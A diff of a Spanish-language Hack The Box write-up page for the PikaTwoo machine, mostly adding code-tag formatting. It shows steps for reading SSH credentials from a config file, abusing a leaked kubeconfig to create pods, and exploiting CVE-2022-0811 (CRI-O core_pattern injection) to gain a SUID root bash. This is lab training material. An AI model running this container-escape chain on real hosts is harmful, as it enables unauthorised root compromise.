-<p>Ahora dentro, si nos ponemos a buscar credenciales veremos un config.yaml, el cual contiene las credenciales ssh de Andrew</p>
+<p>Ahora dentro, si nos ponemos a buscar credenciales veremos un config.yaml, el cual contiene las credenciales ssh de <code>Andrew</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/local/apisix/conf/config.yaml
 </span></span></code></pre></div><p><img src="/htb/PikaTwoo/images/49.png" alt="Pika"></p>
 <p>Ahora podemos conectarnos con ssh con estas credenciales y obtener la user.txt</p>
 <p><img src="/htb/PikaTwoo/images/50.png" alt="Pika"></p>
 <h2 id="privesc">Escalada de privilegios</h2>
-<p>Ahora empieza la escalada de privilegios, podemos ver que en el /home hay otro usuario llamado Jennifer y en su home hay un archivo template.yaml</p>
+<p>Ahora empieza la escalada de privilegios, podemos ver que en el /home hay otro usuario llamado <code>Jennifer</code> y en su home hay un archivo template.yaml</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat template.yaml 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>apiVersion: v1
@@ -696,7 +694,7 @@
 </span></span><span style="display:flex;"><span>  - name: alpine
 </span></span><span style="display:flex;"><span>    image: alpine:latest
 </span></span><span style="display:flex;"><span>    imagePullPolicy: Never
-</span></span></code></pre></div><p>También dentro de esta misma carpeta hay un .kube (lo cual nos da a saber que esta usando un Kubernetes) y dentro de este un config</p>
+</span></span></code></pre></div><p>También dentro de esta misma carpeta hay un .kube (lo cual nos da a saber que esta usando un <code>Kubernetes</code>) y dentro de este un config</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat config
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>apiVersion: v1
@@ -724,7 +722,7 @@
 </span></span><span style="display:flex;"><span>  user:
 </span></span><span style="display:flex;"><span>    client-certificate: /home/jennifer/.minikube/profiles/minikube/jennifer.crt
 </span></span><span style="display:flex;"><span>    client-key: /home/jennifer/.minikube/profiles/minikube/jennifer.key
-</span></span></code></pre></div><p>Podemos listar los &ldquo;namespaces&rdquo; de este config</p>
+</span></span></code></pre></div><p>Podemos listar los <code>namespaces</code> de este config</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ kubectl --kubeconfig /home/jennifer/.kube/config get namespaces
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>NAME              STATUS   AGE
@@ -734,19 +732,19 @@
 </span></span><span style="display:flex;"><span>kube-node-lease   Active   575d
 </span></span><span style="display:flex;"><span>kube-public       Active   575d
 </span></span><span style="display:flex;"><span>kube-system       Active   575d
-</span></span></code></pre></div><p>Viendo que tenemos el config y el template.yaml podemos probar a crear un &ldquo;pod&rdquo; usando los namespaces que hemos listado antes (en mi caso me funciono con development)</p>
+</span></span></code></pre></div><p>Viendo que tenemos el config y el template.yaml podemos probar a crear un <code>pod</code> usando los namespaces que hemos listado antes (en mi caso me funciono con development)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ kubectl --kubeconfig /home/jennifer/.kube/config create -f template.yaml -n development
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>pod/template-pod created
-</span></span></code></pre></div><p>Podemos intentar listar los &ldquo;pods&rdquo; que hay en development, pero no nos dejara</p>
+</span></span></code></pre></div><p>Podemos intentar listar los <code>pods</code> que hay en development, pero no nos dejara</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --kubeconfig /home/jennifer/.kube/config get pods -n development
-</span></span></code></pre></div><p>Si grepeamos por crio podemos ver la version de Kubernetes</p>
+</span></span></code></pre></div><p>Si grepeamos por crio podemos ver la version de <code>Kubernetes</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ grep -R crio
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>APIServerPort:8443 KubernetesVersion:v1.23.3
 </span></span></code></pre></div><p>Esta version tiene una vulnerabilidad bastante reciente</p>
 <p>CVE &ndash;&gt; <a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/</a></p>
-<p>Básicamente lo que nos dice esto es que todos los procesos de Kubernetes usan el mismo kernel, por lo que nos podemos aprovechar para inyectar comandos, primero vamos a irnos al /dev/shm (porque el /tmp se borra cada cierto tiempo), y vamos a crear dos archivos.</p>
+<p>Básicamente lo que nos dice esto es que todos los procesos de <code>Kubernetes</code> usan el mismo <code>kernel</code>, por lo que nos podemos aprovechar para inyectar comandos, primero vamos a irnos al /dev/shm (porque el /tmp se borra cada cierto tiempo), y vamos a crear dos archivos.</p>
 <p>Uno llamado shell.sh el cual tendrá el comando que queremos ejecutar como root</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
@@ -767,17 +765,17 @@
 </span></span><span style="display:flex;"><span>    command: <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;tail&#34;</span>, <span style="color:#e6db74">&#34;-f&#34;</span>, <span style="color:#e6db74">&#34;/dev/null&#34;</span><span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>Ahora creamos el &ldquo;pod&rdquo; con este .yaml</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --kubeconfig /home/jennifer/.kube/config create -f malicius.yaml -n development
-</span></span></code></pre></div><p>Si listamos los procesos del kernel veremos nuestro comando a la espera de ejecutarse</p>
+</span></span></code></pre></div><p>Si listamos los procesos del <code>kernel</code> veremos nuestro comando a la espera de ejecutarse</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ cat /proc/sys/kernel/core_pattern 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>/dev/shm/shell.sh <span style="color:#75715e">#&#39;</span>
 </span></span></code></pre></div><p>Y deslimitamos</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ulimit -c unlimited
-</span></span></code></pre></div><p>Ahora que todo esta listo, lo ejecutamos de esta manera, creamos un proceso en segundo plano</p>
+</span></span></code></pre></div><p>Ahora que todo esta listo, lo ejecutamos de esta manera, creamos un proceso en <code>segundo plano</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tail -f /dev/null &amp;
 </span></span></code></pre></div><p>Final mente matamos este nuevo proceso de esta manera</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kill -SIGSEGV <span style="color:#ae81ff">1086444</span>
-</span></span></code></pre></div><p>Y tendremos la bash con SUID</p>
+</span></span></code></pre></div><p>Y tendremos la bash con <code>SUID</code></p>
 <p><img src="/htb/PikaTwoo/images/51.png" alt="Pika"></p>
 <p>Ahora nos vamos al /root y visualizamos la root.txt ; )</p>
 
@@ -802,13 +800,13 @@
     
     <div class="read-more-item">
         <span class="read-more-item-dim">Recent</span>
-        <h2 class="post-list__post-title post-title"><a href="/htb/2023/03/htb-jupiter/" title="link to HTB - Jupiter">HTB - Jupiter</a></h2>
-        <p class="excerpt">Resolucion de la maquina Jupiter - Medium</p>
+        <h2 class="post-list__post-title post-title"><a href="/htb/2023/07/htb-bankrobber/" title="link to HTB - Bankrobber">HTB - Bankrobber</a></h2>
+        <p class="excerpt">Resolucion de la maquina Bankrobber - Insane</p>
         <div class="post-list__meta">
-            <time datetime=" 2023-09-13 07:28:17 &#43;0800" class="post-list__meta--date date">2023-03-03</time>
+            <time datetime=" 2023-09-13 07:28:17 &#43;0800" class="post-list__meta--date date">2023-07-04</time>
              
             <span class="post-list__meta--tags tags"> 
-                  • <a href="https://rug4lo.github.io/tags/postgresql-query-exploitation">PostgreSQL Query Exploitation</a>   • <a href="https://rug4lo.github.io/tags/multiple-privilege-escalation">Multiple Privilege Escalation</a>  
+                  • <a href="https://rug4lo.github.io/tags/blind-xss-injection">Blind XSS Injection</a>   • <a href="https://rug4lo.github.io/tags/cookie-hijacking">Cookie hijacking</a>   • <a href="https://rug4lo.github.io/tags/sqli">SQLI</a>   • <a href="https://rug4lo.github.io/tags/stealing-net-ntlmv2-hash">Stealing Net-NTLMv2 Hash</a>   • <a href="https://rug4lo.github.io/tags/rce">RCE</a>   • <a href="https://rug4lo.github.io/tags/abusing-a-custom-binary">Abusing a custom binary</a>  
             </span>
             
         </div>
